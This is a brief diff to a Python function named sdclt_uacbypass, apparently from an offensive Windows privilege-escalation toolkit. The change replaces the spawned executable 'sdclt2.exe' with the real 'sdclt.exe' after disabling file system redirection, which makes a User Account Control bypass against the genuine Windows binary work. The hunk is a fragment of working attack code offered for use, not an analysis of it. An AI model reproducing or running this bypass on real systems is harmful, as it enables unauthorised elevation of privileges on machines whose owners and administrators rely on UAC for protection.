@@ -36,7 +36,7 @@ def sdclt_uacbypass(payload):
 		print_info("Disabling file system redirection")
 		with disable_fsr():
 			print_success("Successfully disabled file system redirection")
-			if process().create("sdclt2.exe"):
+			if process().create("sdclt.exe"):
 				print_success("Successfully spawned process ({})".format(payload))
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
